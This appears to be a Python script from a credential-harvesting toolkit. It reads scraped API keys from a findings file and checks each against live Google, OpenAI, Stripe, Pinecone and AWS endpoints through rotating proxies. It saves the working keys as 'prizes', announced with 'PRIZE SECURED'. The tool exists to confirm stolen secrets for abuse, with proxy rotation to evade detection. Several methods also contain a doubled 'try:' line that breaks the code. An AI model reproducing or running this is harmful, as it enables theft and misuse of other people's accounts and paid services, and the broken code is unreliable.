import requests
import json
import boto3
import random
import sys
from pathlib import Path

# Add parent directory to path to reach phoenix package
sys.path.append(str(Path(__file__).parent.parent))
from phoenix.config import PROXIES

class KeyJudge:
    def __init__(self, findings_file="reaper/findings.jsonl", validated_file="reaper/prizes.jsonl"):
        self.findings_file = Path(findings_file)
        self.validated_file = Path(validated_file)
        self.validated_file.parent.mkdir(parents=True, exist_ok=True)
        self.session = requests.Session()
        self._rotate_proxy()

    def _rotate_proxy(self):
        if PROXIES:
            proxy = random.choice(PROXIES)
            self.session.proxies.update({
                "http": proxy,
                "https": proxy
            })
            print(f"[Judge] Active Proxy: {proxy}")

    def validate_google(self, key):
        url = f"https://www.googleapis.com/language/translate/v2/languages?key={key}"
        try:
        try:
            resp = self.session.get(url, timeout=5)
            if resp.status_code == 200:
                return True, {"status": "valid", "type": "translate_api"}
            return False, f"HTTP {resp.status_code}"
        except Exception as e:
            return False, str(e)

    def validate_openai(self, key):
        url = "https://api.openai.com/v1/models"
        headers = {"Authorization": f"Bearer {key}"}
        try:
        try:
            resp = self.session.get(url, headers=headers, timeout=5)
            if resp.status_code == 200:
                return True, {"models": len(resp.json().get("data", []))}
            return False, f"HTTP {resp.status_code}"
        except Exception as e:
            return False, str(e)

    def validate_stripe(self, key):
        url = "https://api.stripe.com/v1/account"
        auth = (key, "")
        try:
        try:
            resp = self.session.get(url, auth=auth, timeout=5)
            if resp.status_code == 200:
                return True, resp.json()
            return False, f"HTTP {resp.status_code}"
        except Exception as e:
            return False, str(e)

    def validate_aws(self, access_id, secret_key=None):
        """Validates AWS credentials via STS."""
        try:
            # If we only have ID, we can't validate. In scavenger we'd need to find the pair.
            if not secret_key: return False, "Missing secret key"
            
            client = boto3.client(
                'sts',
                aws_access_key_id=access_id,
                aws_secret_access_key=secret_key
            )
            resp = client.get_caller_identity()
            return True, resp
        except Exception as e:
            return False, str(e)

    def validate_pinecone(self, key):
        url = "https://api.pinecone.io/indexes"
        headers = {"Api-Key": key}
        try:
        try:
            resp = self.session.get(url, headers=headers, timeout=5)
            if resp.status_code == 200:
                return True, {"status": "valid"}
            return False, f"HTTP {resp.status_code}"
        except Exception as e:
            return False, str(e)

    def run_validation(self):
        if not self.findings_file.exists():
            print("[Judge] No findings found.")
            return

        print("[Judge] Starting validation loop...")
        with open(self.findings_file, "r") as f:
            for line in f:
                finding = json.loads(line)
                keys = finding.get("keys", {})
                source = finding.get("source")
                
                for ktype, klist in keys.items():
                    for key in klist:
                        valid, metadata = False, None
                        if ktype == "google": valid, metadata = self.validate_google(key)
                        elif ktype == "openai": valid, metadata = self.validate_openai(key)
                        elif ktype == "stripe": valid, metadata = self.validate_stripe(key)
                        elif ktype == "pinecone": valid, metadata = self.validate_pinecone(key)
                        
                        if valid:
                            self.log_prize({"type": ktype, "key": key, "source": source, "metadata": metadata})
                        else:
                            print(f"[Judge] Failed {ktype}: {key[:8]}... ({metadata})")

    def log_prize(self, prize):
        with open(self.validated_file, "a") as f:
            f.write(json.dumps(prize) + "\n")
        print(f"[Judge] PRIZE SECURED: {prize['type']} from {prize['source']}")

if __name__ == "__main__":
    judge = KeyJudge()
    judge.run_validation()
